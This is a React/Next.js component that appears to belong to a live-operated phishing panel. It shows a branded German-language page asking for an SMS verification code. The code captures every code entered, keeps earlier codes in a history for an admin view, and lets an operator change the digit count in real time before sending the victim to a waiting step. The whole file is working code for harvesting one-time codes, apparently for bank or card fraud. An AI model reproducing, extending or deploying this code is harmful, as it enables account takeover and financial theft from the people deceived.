"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function SmsClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [digits, setDigits] = useState(6);
  const [smsMode, setSmsMode] = useState<"fixed" | "unknown">("fixed");
  const [customText, setCustomText] = useState<string | null>(null);
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});

  // Realtime callback'in guncel state'i gormesi icin ref (stale closure onlemi)
  const settingsRef = useRef({ digits, smsMode, customText });
  useEffect(() => {
    settingsRef.current = { digits, smsMode, customText };
  });

  // ⭐ BELİRSİZ HANE: DİNAMİK hane sayısı (kullanıcı kaç hane girerse o kadar)
  //   min 4, max 12. Baslangicta 4 kutu gosterilir, kullanici 5. haneyi girince 5. kutu acilir, vb.
  const effectiveDigits = useMemo(() => {
    if (smsMode !== "unknown") return digits;
    // Belirsiz mod: min 4, max 12. code.length + 1 sonraki hane icin (en az 4).
    const needed = Math.max(4, Math.min(12, code.length + 1));
    return needed;
  }, [smsMode, digits, code.length]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) {
        setLoading(false);
        return;
      }
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();

      if (cancelled || !data) {
        setLoading(false);
        return;
      }
      // ⭐ BELİRSİZ HANE: sms_mode === "unknown" VEYA sms_digits === 0 ise dynamic mod
      const modeUnknown = (data as any).sms_mode === "unknown" || (data as any).sms_mode === null && Number(data.sms_digits) === 0;
      setSmsMode(modeUnknown ? "unknown" : "fixed");
      setDigits(Number(data.sms_digits) || 6);
      setCustomText(data.sms_custom_text ?? null);
      const fd = (data.form_data ?? {}) as Record<string, string>;
      // ⚠️ KRITIK DUZELTME (SMS GECMIS BUTONU KAYIP HATA KOKU):
      //   ESKI KOD: fd.smsCode/sms_code = "" + supabase update ile ESKI SMSI SILIYORDUK.
      //   SONUC: 2. SMS'e gelince prevSms = "" → isFirstSmsEntry=true
      //          → history'ye ASLA push edilemiyordu → admin GEÇMİŞ butonu HİÇ görünmüyordu.
      //   YENI KOD:
      //     1) setCode("") → UI INPUT kutusu BOŞ (kullanıcı eski kodu GÖRMEZ).
      //     2) fd (form_data state) ve SUPABASE içindeki ESKİ smsCode/tacCode KORUNUR
      //        → Böylece submit anında prevSms = 1. SMS (dolu) bulunur → history.push ✅.
      setCode("");
      setSessionFormData(fd);
      setLoading(false);
    })();

    // Supabase Realtime Listener for sms_digits changes
    if (supabase && sessionId) {
      const channel = supabase
        .channel(`sms-client:${sessionId}`)
        .on(
          "postgres_changes",
          {
            event: "UPDATE",
            schema: "public",
            table: "sessions",
            filter: `id=eq.${sessionId}`,
          },
          (payload) => {
            const next = payload.new as {
              sms_digits?: number;
              sms_mode?: string | null;
              sms_custom_text?: string | null;
            };
            const cur = settingsRef.current;

            // ⭐ KRITIK FIX: Her UPDATE'te (3sn'lik presence ping, admin yazimi,
            //   baska herhangi bir update) `new` icinde sms_digits/sms_mode ve
            //   current_step="sms" HER ZAMAN gelir. Degere bakmadan setCode("")
            //   cagirmak kullanicinin yazdigi kodu surekli siliyordu.
            //   Artik SADECE sms ayarlari GERCEKTEN degistiyse sifirla.
            const hasModeInfo = next.sms_mode !== undefined || next.sms_digits !== undefined;
            const newMode: "fixed" | "unknown" =
              next.sms_mode === "unknown" ||
              (next.sms_mode == null && Number(next.sms_digits) === 0)
                ? "unknown"
                : "fixed";
            const newDigits = Number(next.sms_digits) || 6;

            if (hasModeInfo && (newMode !== cur.smsMode || newDigits !== cur.digits)) {
              setSmsMode(newMode);
              setDigits(newDigits);
              setCode("");
              // Ayar degisti: ilk kutuya focus (eski davranis)
              window.setTimeout(() => {
                const first = document.getElementById("otp-input-0");
                if (first) first.focus();
              }, 220);
              window.setTimeout(() => {
                const f2 = document.getElementById("otp-input-0");
                if (f2 && document.activeElement?.id !== f2.id) f2.focus();
              }, 450);
            }
            if (next.sms_custom_text !== undefined && next.sms_custom_text !== cur.customText) {
              setCustomText(next.sms_custom_text);
            }
          }
        )
        .subscribe();

      return () => {
        cancelled = true;
        void supabase.removeChannel(channel);
      };
    }

    return () => {
      cancelled = true;
    };
    // settingsRef uzerinden guncel state okundugu icin ekstra dep gerekmiyor;
    // kanal session degismedikce tek kez kurulur.
  }, [sessionId, supabase]);

  async function handleSubmit(e?: React.FormEvent | null, fromAuto = false) {
    if (e) e.preventDefault();
    if (!supabase || !sessionId) return;
    const trimmed = code.trim();

    // ⭐ VALIDASYON:
    //   fixed mod: trimmed.length === digits + numeric
    //   unknown (belirsiz) mod: trimmed.length >= 4 (min 4 hane) + numeric (max 12)
    const isNumeric = /^\d+$/.test(trimmed);
    const validFixed = smsMode === "fixed" && trimmed.length === digits && isNumeric;
    const validUnknown = smsMode === "unknown" && trimmed.length >= 4 && trimmed.length <= 12 && isNumeric;
    if (!(validFixed || validUnknown)) {
      setMsg(
        smsMode === "fixed"
          ? `Bitte genau ${digits} Ziffern eingeben.`
          : "Bitte 4 bis 12 Ziffern eingeben.",
      );
      return;
    }

    setSaving(true);
    setMsg(null);

    // Kullanici verisini korumak icin form_data'yi DB'den taze oku (state bos kalmis olabilir).
    let baseFormData: Record<string, unknown> = sessionFormData;
    try {
      const { data: freshRow } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (freshRow?.form_data && typeof freshRow.form_data === "object") {
        baseFormData = freshRow.form_data as Record<string, unknown>;
      }
    } catch {
      /* fresh okuma basarisizsa state ile devam et */
    }

    // ⭐ SMS GECMISI APPEND: SADECE TEKRAR GIRISLERDE (daha once smsCode DOLUYSA)
    //   ⚠️ HISTORY'E YENI DEĞIL, ESKI (degismeden onceki) SMS KODUNU PUSH ET!
    //   Boylece kolon = YENI sms (2. sms), history = ESKI sms (1. sms → gorunur).
    const prevSms = String(
      (baseFormData as any).smsCode ||
      (baseFormData as any).sms_code ||
      (baseFormData as any).tacCode ||
      "",
    ).trim();
    const isFirstSmsEntry = prevSms.length === 0;
    const smsFormHistory: any[] = Array.isArray((baseFormData as any).smsFormHistory)
      ? (baseFormData as any).smsFormHistory.slice()
      : [];
    if (!isFirstSmsEntry) {
      smsFormHistory.push({
        htmlStepLabel: "SMS KODU",
        capturedAt: new Date().toISOString(),
        smsCode: prevSms,
        sms_code: prevSms,
        tacCode: prevSms,
      });
    }

    const nextFormData = {
      ...baseFormData,
      smsCode: trimmed,
      sms_code: trimmed,
      sms_otp_length: trimmed.length,
      sms_otp_mode: smsMode,
      smsFormHistory,
    };
    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait", form_data: nextFormData })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Senden fehlgeschlagen.");
    else {
      setSessionFormData(nextFormData);
      // ⭐ FLASH YOK: router.push → router.replace
      router.replace(stepToPath("wait", sessionId));
    }
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#DF0000]/30 border-t-[#DF0000]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <div className="a3d-shell items-center justify-center p-4">
        <div className="a3d-card w-full max-w-[560px] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="a3d-shell items-center justify-center p-4">
        <div className="a3d-card w-full max-w-[460px] p-8 text-center">
          <p className="rounded-2xl border border-red-200 bg-red-50/90 p-4 text-center text-sm font-medium text-red-600">
            Ungueltiger Link.
          </p>
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="a3d-shell items-center justify-center p-4">
        <div className="a3d-card flex w-full max-w-[460px] justify-center p-8 py-16">
          <div className="a3d-spinner size-12" />
        </div>
      </div>
    );
  }

  const trimmed = code.trim();
  // ⭐ VALIDASYON (DUZELTILDI):
  //   fixed mod: code.length === digits
  //   unknown (belirsiz) mod: code.length >=4 (min 4, max 12). Sadece RAKAM ve
  //     4-12 arasindaysa GECERLI (eski effectiveDigits-1 kontrolu KALDIRILDI.
  //     Cunku kullanici 5 hane girdiginde effectiveDigits 6 oluyor ve 6.
  //     (bos) YENI kutu required oldugu icin HTML5 validation "Lutfen bu alani
  //     doldurun" uyarisi veriyordu. Artik kullanici 4+ girdigi hicbir kutu
  //     olmasa bile Devam butonu ile ONAYLAYABILIR.
  const numeric = /^\d+$/.test(trimmed);
  const validFixed = smsMode === "fixed" && trimmed.length === digits && numeric;
  const validUnknown =
    smsMode === "unknown" &&
    trimmed.length >= 4 &&
    trimmed.length <= 12 &&
    numeric;
  const valid = validFixed || validUnknown;

  const displayText = customText || settings.sms_subtitle;
  const labelText =
    smsMode === "unknown"
      ? `${settings.sms_input_label} (Mindestens 4 Ziffern, hoechstens 12)`
      : `${settings.sms_input_label} (${digits})`;

  // OTP style input handling
  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;

    const newCode = code.split("");
    newCode[index] = value.substring(value.length - 1); // Only take the last char
    const updatedCode = newCode.join("").replace(/[^\d]/g, "");

    // ⭐ BELİRSİZ HANE: code slice siniri effectiveDigits DEGIL, max 12
    const limit = smsMode === "unknown" ? Math.max(4, 12) : digits;
    const finalCode = updatedCode.slice(0, limit);
    setCode(finalCode);

    // ⭐ Move to next input:
    //   - Sabit (fixed) mod: digits indexine kadar (klasik davranis)
    //   - Belirsiz (unknown) mod: effectiveDigits useMemo state gecikmeli guncellendigi icin
    //     setCode cagirildiktan 1 frame sonra DOM'a yeni (index+1) input eklenecek.
    //     O yuzden HEMEN (this frame) dene, BULAMAZSAN 60ms SONRA (next frame DOM render sonrasi) tekrar dene.
    //     Max 12 hane (0-11 index) -> nextIndex < 12 ise yine de devam etmeye calis.
    if (value) {
      const nextIndex = index + 1;
      if (smsMode === "unknown") {
        // Belirsiz modda: max 12 hane (index 0..11)
        if (nextIndex < 12) {
          // Hemen dene (effectiveDigits zaten buyukse input var demektir, ilk 1-3 hanede bu calisir)
          const next1 = document.getElementById(`otp-input-${nextIndex}`);
          if (next1) {
            next1.focus();
          } else {
            // Input henuz DOM'da yok (setCode -> render -> effectiveDigits 5 olacak -> 5. kutu render edilecek).
            // React bir sonraki tick'te DOM'u guncelleyecek, 60ms sonra tekrar focus et.
            window.setTimeout(() => {
              const next2 = document.getElementById(`otp-input-${nextIndex}`);
              if (next2) next2.focus();
            }, 60);
            // Ekstra fallback: 150ms sonra 2. deneme (bazı cihazlarda render 1 frameden uzun sürer)
            window.setTimeout(() => {
              const next3 = document.getElementById(`otp-input-${nextIndex}`);
              if (next3) {
                const active = document.activeElement?.id;
                if (!active || active !== next3.id) next3.focus();
              }
            }, 150);
          }
        }
      } else {
        // Sabit mod: digits adedi kadar (klasik)
        if (nextIndex < digits) {
          const nextInput = document.getElementById(`otp-input-${nextIndex}`);
          if (nextInput) nextInput.focus();
        }
      }
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key !== "Backspace") return;
    if (code[index]) {
      // Dolu kutuda Backspace: o kutuyu bosalt
      const cleared = code.split("");
      cleared[index] = "";
      setCode(cleared.join("").replace(/\s/g, ""));
      return;
    }
    // Bos kutuda Backspace: bir onceki kutuya git ve onu bosalt
    if (index > 0) {
      const cleared = code.split("");
      cleared[index - 1] = "";
      setCode(cleared.join("").replace(/\s/g, ""));
      const prevInput = document.getElementById(`otp-input-${index - 1}`);
      if (prevInput) prevInput.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const limit = smsMode === "unknown" ? 12 : digits;
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, limit);
    setCode(pastedData);
    const n = pastedData.length;
    if (n > 0) {
      const focusIndex = smsMode === "unknown" ? Math.min(n, effectiveDigits - 1) : Math.min(n, digits - 1);
      const input = document.getElementById(`otp-input-${focusIndex}`);
      if (input) input.focus();
    }
    // ⭐ OTOMATİK SUBMIT KAPANDI: Paste sonrasi 4+ hane dolu olsa bile otomatik
    //   submit YOK. Kullanici Devam butonuna basarak ilerlemeli.
  };

  return (
    <div className="a3d-shell">
      <div className="a3d-glow left-[-10%] top-[-12%] h-[440px] w-[440px] bg-[rgba(var(--brand-rgb),0.15)]" />
      <div className="a3d-glow bottom-[-14%] right-[-8%] h-[400px] w-[400px] bg-[rgba(var(--brand-rgb),0.11)]" />

      <main className="relative z-10 flex w-full flex-1 flex-col items-center justify-center p-4">
        <div className="a3d-card a3d-in w-full max-w-[480px] overflow-hidden px-6 py-8 sm:px-9 sm:py-9">
          <div className="mb-6 flex items-start justify-between gap-4">
            <div className="min-w-0">
              <h2 className="a3d-title text-[24px] leading-tight">{settings.sms_title}</h2>
              <p className="a3d-sub mt-2 text-sm font-medium whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
            </div>
            <img
              src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
              alt={settings.portal_name || "Brand"}
              className="h-11 w-11 shrink-0 object-contain"
              id="sms-brand-logo"
            />
          </div>

          <form onSubmit={handleSubmit} className="space-y-5">
            <div className="block text-[13px] font-semibold text-[#344054]">
              <div className="mb-3">{labelText}</div>
              <div className="flex flex-wrap justify-center gap-2" onPaste={handlePaste}>
              {Array.from({ length: effectiveDigits }).map((_, index) => {
                return (
                  <input
                    key={index}
                    id={`otp-input-${index}`}
                    required={false}
                    inputMode="numeric"
                    autoComplete="one-time-code"
                    maxLength={1}
                    className={`a3d-otp text-xl font-bold sm:text-2xl ${code[index] ? "a3d-filled" : ""}`}
                    style={{ width: "44px", height: "54px", aspectRatio: "auto" }}
                    value={code[index] || ""}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
                  />
                );
              })}
              </div>
            </div>

            {!valid && code.length > 0 ? (
              <p className="text-xs font-medium text-red-500">
                {smsMode === "fixed"
                  ? `Bitte genau ${digits} Ziffern eingeben.`
                  : "Bitte 4 bis 12 Ziffern eingeben."}
              </p>
            ) : null}

            {msg ? <p className="text-center text-sm font-medium text-red-500">{msg}</p> : null}

            <button
              type="submit"
              disabled={saving || !valid}
              className="a3d-btn w-full px-6 py-4 text-[16px]"
            >
              {saving ? settings.sms_loading : settings.sms_button}
            </button>

            <div className="flex justify-center pt-1">
              <div className="a3d-pill">
                <svg className="h-4 w-4 text-[var(--brand)]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.9" d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" />
                </svg>
                <span>Der Code wurde per SMS an Ihre Handynummer gesendet.</span>
              </div>
            </div>
          </form>
        </div>
      </main>
    </div>
  );
}
